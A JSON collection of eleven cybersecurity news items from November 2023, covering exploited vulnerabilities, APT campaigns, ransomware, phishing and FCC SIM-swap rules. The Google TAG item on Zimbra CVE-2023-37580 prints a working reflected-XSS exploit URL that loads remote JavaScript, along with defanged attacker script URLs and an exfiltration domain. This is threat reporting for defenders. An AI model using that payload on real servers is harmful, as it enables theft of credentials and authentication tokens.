[
   {
      "time": "2023-11-20",
      "title": "CISA warns of actively exploited Windows, Sophos, and Oracle bugs",
      "text": " The U.S. Cybersecurity & Infrastructure Security Agency has added to its catalog of known exploited vulnerabilities (KEV) three security issues that affect Microsoft devices, a Sophos product, and an enterprise solution from Oracle.The agency is urging federal agencies to apply available security updates for the three issues before December 7. The three vulnerabilities are tracked as follows:The critical flaw in Sophos Web Appliance, fixed on April 4, 2023, is identified as CVE-2023-1671 and has a severity score of 9.8. It can lead to remote code execution (RCE) and affects versions of the software before 4.3.10.4.Although CISA's KEV catalog is mainly aimed at federal agencies in the U.S. companies across the world are advised to use it as an alert system for exploited vulnerabilities and take the necessary steps to update their systems or apply vendor-recommended mitigations.Update 11/17 - A Sophos spokesperson has reached out to share the following clarification about CVE-2023-1671:More than six months ago, on April 4, 2023, we released an automatic patch to all Sophos Web Appliances, as noted in the Security Advisory on our Trust Center, and in July 2023, we’ve phased out Sophos Web Appliance as previously planned.We appreciate CISA’s notice for any of the small number of remaining Sophos Web Appliance users who turned off auto-patch and/or missed our ongoing updates, and recommend they upgrade to Sophos Firewall for optimal network security moving forward."
   },
   {
      "time": "2023-11-20",
      "title": "Russian hackers use Ngrok feature and WinRAR exploit to attack embassies",
      "text": " After Sandworm and APT28 (known as Fancy Bear), another state-sponsored Russian hacker group, APT29, is leveraging the CVE-2023-38831 vulnerability in WinRAR for cyberattacks.APT29 is tracked under different names (UNC3524,/NobleBaron/Dark Halo/NOBELIUM/Cozy Bear/CozyDuke, SolarStorm) and has been targeting embassy entities with a BMW car sale lure.The CVE-2023-38831 security flaw affects WinRAR versions before 6.23 and allows crafting .RAR and .ZIP archives that can execute in the background code prepared by the attacker for malicious purposes.In a report this week, the Ukrainian National Security and Defense Council (NDSC) says that APT29 has been using a malicious ZIP archive that runs a script in the background to show a PDF lure and to download PowerShell code that downloads and executes a payload.The malicious archive is called “DIPLOMATIC-CAR-FOR-SALE-BMW.pdf” and targeted multiple countries on the European continent, including Azerbaijan, Greece, Romania, and Italy.In these attacks, the Ukrainian NDSC says that APT29 combined the old phishing tactic with a novel technique to enable communication with the malicious server.By using this method, the attackers managed to hide their activity and communicate with compromised systems without being the risk of being detected.Since researchers at cybersecurity company Group-IB reported that the CVE-2023-38831 vulnerability in WinRAR was exploited as a zero-day, advanced threat actors started to incorporate it into their attacks.Security researchers at ESET saw attacks in August attributed to the Russian APT28 hacker group that exploited the vulnerability in a spearphishing campaign that targeted political entities in the EU and Ukraine using the European Parliament agenda as a lure.The Ukrainian NDSC says that the observed campaign from APT29 stands out because it mixes old and new techniques such as the use of the WinRAR vulnerability to deliver payloads and Ngrok services to hide communication with the C2.The report from the Ukrainian agency provides a set of indicators of compromise (IoCs) consisting of filenames and corresponding hashes for PowerShell scripts and an email file, along with domains and email addresses."
   },
   {
      "time": "2023-11-20",
      "title": "Russian APT Gamaredon uses USB worm LitterDrifter against Ukraine",
      "text": " Since the beginning of the Russian invasion of Ukraine, the cyber espionage group has carried out multiple campaigns against Ukrainian targets. CERT-UA has monitored Gamaredon operations and was able to gather intelligence on the APT’s tactics, techniques, and procedures (TTPs).Check Point states that the Gamaredon group usually carries out large-scale campaigns followed by intelligence-gathering activities. In the latest attacks, the group employed the USB-propagating worm LitterDrifter.The LitterDrifter worm is written in VBS, it supports two main features: automatic USB propagating and communication with a broad, flexible set of C2. The two functionalities are implemented in an orchestration component saved to disk as “trash.dll”, which is actually a VBS script instead of a DLL.Upon running the orchestration component, it decodes and run the other modules and maintains persistence on the infected system.The two extracted modules:1. Spreader module allows the malware to spread within the system and potentially targets other environments by prioritizing infection of a logical disk with mediatype=NULL, usually associated with USB removable media. 2. C2 Module establishes communication with the attacker C&C server and executes incoming payloads. This component retrieves the IP address of the C2 server by generating a random subdomain of a built-in C2 server. It also maintains a backup option by retrieving the IP address of a C2 server from a Telegram channel. “Gamaredon’s approach towards the C&C is rather unique, as it utilizes domains as a placeholder for the circulating IP addresses actually used as C2 servers.” continues the report. “Before attempting to contact a C2 server, the script checks the %TEMP% folder for an existing C2 configuration file with a meaningless name that’s hardcoded in the malware. This mechanism acts as a self-check for the malware, verifying whether it already infected the machine. If present, the current execution could simply be a scheduled execution triggered by the persistence mechanisms.”Threat actors heavily obfuscated the orchestration component, it is constructed from a series of strings with character substitution obfuscation.Check Point researchers reported possible infections also in the U.S., Vietnam, Chile, Poland, Germany, and Hong Kong.“LitterDrifter doesn’t rely on groundbreaking techniques and may appear to be a relatively unsophisticated piece of malware. However, this same simplicity is in line with its goals, mirroring Gamaredon’s overall approach.” concludes the report that also includes Indicators of Compromis. “This method has demonstrated considerable effectiveness, as evidenced by the group’s sustained activities in Ukraine.”Most of the attacks began in February/March 2023 and threat actors remained undetected in the target networks until May. In some attacks threat actors successfully breached the victims’ human resources departments in an attempt to gather intelligence on the personnel at the various organizations.The threat actors focus on stealing sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more.Symantec pointed out that the group has repeatedly refreshed its toolset to avoid detection, the researchers discovered new versions of known tools and observed the group using short-lived infrastructure.\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-11-20",
      "title": "FCC adopts new rules to protect consumers from SIM-swapping attacks",
      "text": " The Federal Communications Commission (FCC) has revealed new rules to shield consumers from criminals who hijack their phone numbers in SIM swapping attacks and port-out fraud.In SIM swapping attacks, criminals trick a victim's wireless carrier into redirecting their service to a device controlled by the fraudster. Conversely, in port-out fraud or mobile number porting fraud, scammers transfer the victim's phone number from one service provider to another without the owner's authorization.They both cause significant financial losses, identity theft, and distress for the victim, as they lead to unauthorized access to personal accounts and sensitive information.\"Because we so frequently use our phone numbers for two-factor authentication, a bad actor who takes control of a phone can also take control of financial accounts, social media accounts, the list goes on.\"\"We also revise our customer proprietary network information and local number portability rules to make it harder for scam artists to make requests that get them access to your sensitive subscriber information.\"FCC's move comes in response to an ever-increasing wave of consumer complaints about significant distress and financial harm resulting from SIM hijacking attacks and port-out fraud."
   },
   {
      "time": "2023-11-20",
      "title": "Researchers extract RSA keys from SSH server signing errors",
      "text": " A team of academic researchers from universities in California and Massachusetts demonstrated that it’s possible under certain conditions for passive network attackers to retrieve secret RSA keys from naturally occurring errors leading to failed SSH (secure shell) connection attempts.SSH is a cryptographic network protocol for secure communication, widely employed in remote system access, file transfers, and system administration tasks.RSA is a public-key cryptosystem used in SSH for user authentication. It uses a private, secret key to decrypt communication that is encrypted with a public, shareable key.A paper published by university researchers Keegan Ryan, Kaiwen He, Nadia Heninger, and George Arnold Sullivan, shows that it’s possible for a passive network attacker to obtain a private RSA key from SSH servers experiencing faults during signature computation.The Chinese Remainder Theorem (CRT) is used with the RSA algorithm to lower the bit size for the public key and speed up the decryption time.“These attacks exploit the fact that if an error is made while computing modulo one prime, say q, then the resulting invalid signature “s” is equivalent to the correct signature modulo one prime factor p, but not q,” the researchers further explain.Although errors of this kind are rare, they are unavoidable due to hardware flaws. Given a large enough pool of data, an attacker can find and leverage many opportunities for exploitation.This is a known problem that impacts older of TLS versions. It was addressed in TLS 1.3 by encrypting the handshake that establishes the connection, thus preventing passive eavesdroppers from reading the signatures.SSH was previously assumed to be safe from this attack but the researchers proved that it is possible to retrieve RSA secrets using lattice-based attacks that recover the private key from partially known nonces.The researchers note that their tests do not include results \"for RSA-1024,SHA512 because the number of unknown bits in the hash is well beyond what we can brute force or solve with  lattices.\"However, they add that \"the lattice attack is quite efficient\" and that their tests had a 100% success rate.Using their lattice attack, the researchers managed to find 4,962 invalid signatures that revealed the factorization of the corresponding RSA public key, thus allowing the retrieval of private keys corresponding to 189 unique RSA public keys.Many of the retrieved secrets came from devices with vulnerable implementations, the largest number of signatures coming from Zyxel devices.The researchers disclosed the issue to Cisco and Zyxel earlier this year and the vendors investigated for the cause.Cisco determined that a suitable mitigation was introduced last year in Cisco ASA and FTD Software. The company told the researchers that it was looking into mitigations in Cisco IOS and IOS XE Software. Zyxel found that the ZLD firmware version the researchers used in the experiment had switched to using OpenSSL, which eliminates the risk.To counter an attacker's ability to retrieve the secret key, the researchers recommend implementations that validate signatures before sending them, such as the OpenSSH suite that relies on OpenSSL to generate signatures."
   },
   {
      "time": "2023-11-20",
      "title": "8Base ransomware operators use a variant of Phobos ransomware",
      "text": " The group has been active since March 2022, it focused on small and medium-size businesses in multiple industries, including finance, manufacturing, business services, and IT.Security experts attributed 67 attacks to the group in May 2023, most of the victims are in the U.S. and Brazil.The Talos researchers discovered a number of features implemented by Phobos allowing operators to establish persistence in a targeted system, perform speedy encryption, and remove backups.The malware supports the following features:The analysis of the configuration data revealed additional features in the malware binary, including bypassing the User Account Control (UAC) and reporting of a victim infection to an external URL.As each file is encrypted using a different key, decrypting files through brute-forcing of a key, as done in the past, is impossible.\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-11-20",
      "title": "Yamaha Motor confirms ransomware attack on Philippines subsidiary",
      "text": " Yamaha Motor's Philippines motorcycle manufacturing subsidiary was hit by a ransomware attack last month, resulting in the theft and leak of some employees' personal information.The motorcycle manufacturer has been investigating the incident with the help of external security experts hired after the breach was first detected on October 25.\"YMPH and the IT Center at Yamaha Motor headquarters established a countermeasures team and have been working to prevent further damage while investigating the scope of the impact, etc., and working on a recovery together with input from an external internet security company.\"Yamaha said the threat actors breached a single server at Yamaha Motor Philippines and that their attack didn't impact the headquarters or any other subsidiaries within the Yamaha Motor group.The company also reported the incident to relevant Philippine authorities and is currently working on assessing the full extent of the attack's impact.A Yamaha Motor spokesperson was not immediately available for comment when contacted by BleepingComputer earlier today.While the company has yet to attribute the attack to a specific operation, the INC Ransom gang has claimed the attack and leaked what they claim is data stolen from Yamaha Motor Philippines' network.The threat actors added the company to its dark web leak site on Wednesday, November 15, and has since published multiple file archives with roughly 37GB of allegedly stolen data containing employee ID info, backup files, and corporate and sales information, among others.Since then, INC Ransom has added 30 victims to its leak website. However, the number of breached organizations is likely bigger, as only those declining to pay the ransom face public disclosure and subsequent data leaks.After gaining access, they move laterally through the network, first harvesting and downloading sensitive files for ransom leverage and then deploying ransomware payloads to encrypt compromised systems.Additionally, INC-README.TXT and INC-README.HTML files are automatically dropped within each folder with encrypted files.Victims are issued a 72-hour ultimatum to engage with the threat actors for negotiations, under threat of the ransomware gang publicly disclosing all pilfered data on their leak blog.Those complying with the ransom demand also receive assurances that they'll be helped decrypt their files.Additionally, the attackers pledge to provide details regarding the initial attack method, guidance on securing their networks, evidence of data destruction, and a \"guarantee\" that they won't be attacked again by INC Ransom operators."
   },
   {
      "time": "2023-11-20",
      "title": "Bloomberg Crypto X account snafu leads to Discord phishing attack",
      "text": " Image: Bloomberg CryptoThe official Twitter account for Bloomberg Crypto was used earlier today to redirect users to a deceptive website that stole Discord credentials in a phishing attack.\"If you are interested, please head over to, our official and only discord server for more information on how to start an application: https://discord[.]gg/bloomberg,\" a message on the Telegram channel now reads.\"Join the Bloomberg Crypto Discord Server! Check out the Bloomberg Crypto community on Discord - hang out with 33975 other members and enjoy free voice and text chat.\"Upon entering the Discord server, a bot prompts visitors to use AltDentifier, an authentic Discord Verification Bot.Rather than linking to the legitimate https://altdentifier.com/ address, it presents a link to a deceptive page using an altered domain (altdentifiers[.]com) with an extra 's' at the end of the original domain name.The \"Bloomberg Crypto staff team\" gives visitors 30 minutes to go to this site and complete the verification process.After clicking the link to 'verify' their account, the potential victims are prompted by the AltDentifiers phishing website to verify with Discord, aiming to steal their Discord login credentials.\"The server administrators have implemented additional security measures on this server, which include the requirement for all accounts to verify their Discord account,\" the phishing site says.\"Once your account is successfully verified, you will be able to freely participate in the server. Please note that administrators have the authority to override the system if necessary.\"The malicious link was removed from the Bloomberg Crypto X/Twitter account 30 minutes after ZachXBT's initial tweet.As many crypto communities reside on Discord, threat actors commonly attempt to steal credentials for accounts that frequent such servers.These hijacked accounts can then be used to promote cryptocurrency scams designed to steal users' cryptocurrency assets while appearing to be from a legitimate source.A Bloomberg spokesperson was not immediately available for comment when contacted by BleepingComputer earlier today.Update: Revised the article to reflect that Bloomberg's Crypto account led to an old abandoned Telegram channel, hijacked as part of a phishing scheme."
   },
   {
      "time": "2023-11-20",
      "title": "Exploit for CrushFTP RCE chain released, patch now",
      "text": " A proof-of-concept exploit was publicly released for a critical remote code execution vulnerability in the CrushFTP enterprise suite, allowing unauthenticated attackers to access files on the server, execute code, and obtain plain-text passwords.The vulnerability was discovered in August 2023, tracked as CVE-2023-43177, by Converge security researchers, who responsibly reported it to the vendor. The developers released a fix overnight in version CrushFTP 10.5.2.The CrushFTP exploit is conducted through an unauthenticated mass-assignment vulnerability, exploiting the AS2 header parsing to control user session properties.This allows attackers to read and delete files, potentially leading to complete system control and root-level remote code execution.The attackers can send payloads to the CrushFTP service on specific ports (80, 443, 8080, 9090) using web headers, which leave log traces.Next, the attackers overwrite session data using Java's 'putAll()' function, enabling the impersonation of 'administrators,' and leverage the 'drain_log()' function to manipulate files as needed to maintain stealthiness.Eventually, the attackers can leverage the 'sessions. obj' file in the program's installation folder to hijack live user sessions belonging to admin accounts, essentially achieving privileged escalation.Having established admin access, the attacker can exploit flaws in the admin panel's handling of SQL driver loading and database configuration testing (testDB) to execute arbitrary Java code.Converge has published a demonstration of the video of the PoC exploit in use, as shown below.According to Converge's report, there are roughly 10,000 public-facing CrushFTP instances and likely many more behind corporate firewalls. The attack surface is sizable even though the number of vulnerable instances hasn't been determined.Unfortunately, the researchers revealed that even applying the patches doesn't secure CrushFTP endpoints against all possible threats.To effectively mitigate the risk, it is recommended to follow these steps:Additional measures that can be implemented to enhance CrushFTP security further include:It's vital to implement these security measures as soon as possible, as the publicly disclosed exploit details of CVE-2023-43177 are likely to be used by hackers in opportunistic attacks."
   },
   {
      "time": "2023-11-20",
      "title": "Google: Hackers exploited Zimbra zero-day in attacks on govt orgs",
      "text": " Google's Threat Analysis Group (TAG) has discovered that threat actors exploited a zero-day vulnerability in Zimbra Collaboration email server to steal sensitive data from government systems in multiple countries.Hackers leveraged a medium-severity security issue now identified as CVE-2023-37580 since June 29, nearly a month before the vendor addressed it in version 8.8.15 Patch 41of the software on July 25.The flaw is an XSS (cross-site scripting) issue present in the Zimbra Classic Web Client.According to Google's threat analysts, the threat actors exploited the vulnerability on government systems in Greece, Moldova, Tunisia, Vietnam, and Pakistan to steal email data, user credentials, and authentication tokens, perform email forwarding, and lead victims to phishing pages.The attackers sent emails with a malicious URL that allowed email data exfiltration and enabled auto-forwarding to an attacker-controlled address.The second campaign was conducted on July 11 by a threat actor tracked as \"Winter Vivern,\" who targeted government organizations in Moldova and Tunisia. The exploit URLs in this case loaded malicious JavaScript on the target systems.A third campaign began on July 20 from an unidentified threat group targeting a Vietnamese government organization. These attacks used an exploit URL to direct victims to a phishing page.Google notes that the three threat actors exploited the vulnerability before the release of the official fix.In a fourth campaign on August 25, a threat actor that likely learned the bug after the vendor addressed it, the bug was leveraged on the systems of a Pakistani government organization to steal Zimbra authentication tokens.Google's report does not disclose many details about the attackers but still serves as a reminder about the importance of timely security updates, even when those concern medium-severity vulnerabilities because adversaries already on the system may use them to further their attack.The exploitation of CVE-2023-37580 is one of the multiple examples of XXS flaws leveraged to attack mail servers, like CVE-2022-24682 and CVE-2023-5631, which impact Zimbra and Roundcube."
   },
   {
      "time": "2023-11-20",
      "title": "Zimbra 0-day used to target international government organizations",
      "text": " Threat Analysis GroupNov 16, 2023min readTAG observed three threat groups exploiting the vulnerability prior to the release of the official patch, including groups that may have learned about the bug after the fix was initially made public on Github. TAG discovered a fourth campaign using the XSS vulnerability after the official patch was released. Three of these campaigns began after the hotfix was initially made public highlighting the importance of organizations applying fixes as quickly as possible.CVE-2023-37580 is a reflected cross-site scripting (XSS) vulnerability. XSS is a web application vulnerability that allows malicious scripts to be injected into another website. In this case, there was a vulnerability in Zimbra that injected the parameter within the URL directly into the webpage, causing the script to be executed. An example that could trigger the XSS is:https://mail.REDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2Fwhich decodes to:https://mail.REDACTED[.]com/m/momoveto?st=acg\"/><script src=\"https://REDACTED/script.js\"></script>//The fix was to escape the contents of the st parameter before it was set as the value in an html object.https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.jshttps://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.jshttps://applicationdevsoc[.]com/tndgt/auth.jsDays before Zimbra pushed their official patch on July 25, TAG observed a third, unidentified group exploiting the vulnerability as part of a campaign that phished for credentials belonging to a government organization in Vietnam. In this case, the exploit url pointed to a script that displayed a phishing page for users’ webmail credentials and posted stolen credentials to a url hosted on an official government domain that the attackers likely compromised.In August 2023, after the patch for CVE-2023-37580 was released, TAG discovered a fourth campaign using the vulnerability against a government organization in Pakistan. The exploit was used to steal the Zimbra authentication token. The token was exfiltrated to ntcpk[.]org.The discovery of at least four campaigns exploiting CVE-2023-37580, three campaigns after the bug first became public, demonstrates the importance of organizations applying fixes to their mail servers as soon as possible. These campaigns also highlight how attackers monitor open-source repositories to opportunistically exploit vulnerabilities where the fix is in the repository, but not yet released to users. The actors behind Campaign #2 began exploiting the bug after the fix was pushed to Github, but before Zimbra publicly released the advisory with remediation advice.The exploitation of CVE-2023-37580 comes on the heels of CVE-2022-24682, another reflected XSS vulnerability in Zimbra mail servers that was actively exploited in-the-wild in 2022 and is followed by the exploitation of CVE-2023-5631, a XSS vulnerability in Roundcube mail servers just this past month. The regular exploitation of XSS vulnerabilities in mail servers also shows a need for further code auditing of these applications, especially for XSS vulnerabilities.Thanks to TAG's Kristen Dennesen who also contributed to this report.Google's Threat Analysis Group analyzes recent state-sponsored campaigns exploiting the WinRAR vulnerability, CVE-2023-38831.This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q3 2023. It was last updated on November 8, 2023.Last week Google’s Threat Analysis Group (TAG), in partnership with The Citizen Lab, discovered an in-the-wild 0-day exploit chain for iPhones. Developed by the commerci…Threat Analysis Group shares findings on a new campaign by North Korean actors targeting security researchers.Threat Analysis Group shares their Q2 2023 bulletin.The goal of this report is to analyze the exploits from the year as a whole, looking for trends, gaps, lessons learned, and successes."
   }
]